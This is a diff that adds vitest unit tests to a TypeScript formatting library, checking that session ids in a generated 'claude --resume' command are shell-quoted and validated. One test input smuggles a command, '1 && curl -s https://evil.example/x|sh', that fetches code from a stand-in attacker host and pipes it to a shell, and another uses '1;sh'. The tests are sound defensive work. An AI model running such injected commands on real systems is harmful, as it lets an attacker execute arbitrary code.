@@ -1,8 +1,15 @@
 import { describe, expect, it } from 'vitest';
 
-import { duration, resumeCommand, shellQuote, shortPath } from '../src/web/lib/format';
+import { duration, isSessionId, resumeCommand, shellQuote, shortPath } from '../src/web/lib/format';
 
 describe('resumeCommand', () => {
+  it('quotes the session id too: an id from the address never runs as a command', () => {
+    expect(resumeCommand('1 && curl -s https://evil.example/x|sh')).toBe("claude --resume '1 && curl -s https://evil.example/x|sh'");
+    expect(resumeCommand("a'b")).toBe("claude --resume 'a'\\''b'");
+    expect(isSessionId('4e05eb31-6d40-4b57-93dd-bf4aeb9374cf')).toBe(true);
+    expect(isSessionId('1;sh')).toBe(false);
+  });
+
   it('quotes folders the shell would split, and keeps ~ working', () => {
     expect(resumeCommand('abc', '/work/app')).toBe('cd /work/app && claude --resume abc');
     expect(resumeCommand('abc', '/work/my app')).toBe("cd '/work/my app' && claude --resume abc");
